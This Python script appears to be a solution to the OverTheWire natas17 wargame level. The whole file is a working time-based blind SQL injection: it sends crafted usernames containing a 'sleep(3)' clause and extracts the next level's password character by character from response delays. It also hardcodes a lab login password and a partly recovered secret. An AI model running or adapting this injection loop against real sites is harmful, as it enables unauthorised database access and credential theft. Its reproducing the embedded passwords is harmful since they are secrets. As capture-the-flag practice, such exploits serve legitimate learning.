import requests
import sys

url = "http://natas17.natas.labs.overthewire.org"
user = "natas17"
password = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"
prefix = "natas18\" and password like binary \""
postfix = "%\" and sleep(3) # "
possible_chars = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789'
possible_leading_chars = 'x'
solution = 'xvKIqDjy4OPv7wCRgDlmj'

def tryPassword(param):
    resp = requests.post(url, data={"username": param}, auth=(user, password))
    if resp.elapsed.total_seconds() > 2:
        return True
    else:
        return False

def tryForOneChar(solution, chars):
     for char in chars:
        trial_solution = solution + char
        needle_param = prefix + trial_solution + postfix
        result = tryPassword(needle_param)
        if result:
            return char
     return False

while len(solution) < 32:
    new_char = tryForOneChar(solution, possible_chars)
    if new_char == False:
        print('Failed to pick new char, solution so far: ' + solution)
        sys.exit()
    else:
        solution = solution + new_char
        print('new solution: ' + solution)
